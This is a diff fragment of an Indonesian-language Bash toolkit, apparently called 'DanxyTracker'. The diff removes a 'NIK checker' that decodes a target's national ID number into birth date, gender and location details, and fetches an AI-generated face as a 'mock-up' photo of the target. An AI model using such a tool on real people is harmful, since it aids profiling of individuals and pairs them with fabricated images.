-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}" | lolcat
-    echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"
-
-    # Input NIK
-    read -p "$(echo -e ${RED}Input\ NIK\ Target:\ ${NC})" nik
-    if ! [[ $nik =~ ^[0-9]{16}$ ]]; then
-        echo -e "${RED}ERROR! NIK Tidak Valid!${NC}"
-        exit 1
-    fi
-
-    # --- loading (disingkat) ---
-    (sleep 2) & spin $! && wait
-
-    # --- parsing NIK (logika Anda) ---
-    tanggal="${nik:6:2}"
-    bulan="${nik:8:2}"
-    tahun="${nik:10:2}"
-    prov="${nik:0:2}"
-    kabkot="${nik:0:4}"
-    kecamatan="${nik:0:6}"
-    uniqcode="${nik:12:4}"
-
-    if ((10#$tanggal > 40)); then
-        tanggal=$((10#$tanggal - 40))
-        jeniskelamin="PEREMPUAN"
-    else
-        jeniskelamin="LAKI-LAKI"
-    fi
-
-    # Ambil data lokasi (asumsi data.json ada)
-    if [[ ! -f "data.json" ]]; then
-        echo -e "${RED}! Data Tidak Valid !${NC}"
-        exit 1
-    fi
-    provinsi=$(jq -r --arg p "$prov" '.provinsi[$p] // $p' data.json)
-    kabupaten=$(jq -r --arg k "$kabkot" '.kabkot[$k] // $k' data.json)
-    kecamatan_data=$(jq -r --arg kc "$kecamatan" '.kecamatan[$kc] // $kc' data.json)
-    IFS='--' read -r kecamatan_name kode_pos <<< "$kecamatan_data"
-
-    # --- download mock foto ---
-    mkdir -p hasil
-    foto_file="hasil/foto_${nik}.jpg"
-    curl -s "https://thispersondoesnotexist.com/image" \
-         -H "User-Agent: Mozilla/5.0" \
-         --output "$foto_file"
-    if [[ $? -ne 0 || ! -s "$foto_file" ]]; then
-        echo -e "${RED}Gagal unduh foto mock-up${NC}"
-        foto_file=""
-    fi
-
-    # --- tampilkan hasil ---
-    echo -e "${GREEN}!Tanggal Lahir: $tanggal/$bulan/$tahun${NC}"
-    echo -e "${GREEN}!Jenis Kelamin: $jeniskelamin${NC}"
-    echo -e "${GREEN}!Provinsi: $provinsi${NC}"
-    echo -e "${GREEN}!Kab/Kota: $kabupaten${NC}"
-    echo -e "${GREEN}!Kecamatan: $kecamatan_name${NC}"
-    echo -e "${GREEN}!Kode Pos: $kode_pos${NC}"
-    echo -e "${GREEN}!Uniqcode: $uniqcode${NC}"
-
-    if [[ -n "$foto_file" ]]; then
-        echo -e "${GREEN}!Foto mock-up disimpan di: $foto_file${NC}"
-        # opsional tampilkan di terminal (iTerm2)
-        command -v imgcat >/dev/null && imgcat "$foto_file"
-        # atau buka di viewer default:
-        # xdg-open "$foto_file" 2>/dev/null || open "$foto_file"
-    fi
-}
-
 
 track_live() {
 mkdir -p DanxyTracker
@@ -4147,3 +4155,11 @@ main_menu
   stop_music
   kembali_ke_menu
   ;;
+
+
+
+
+
+
+
+
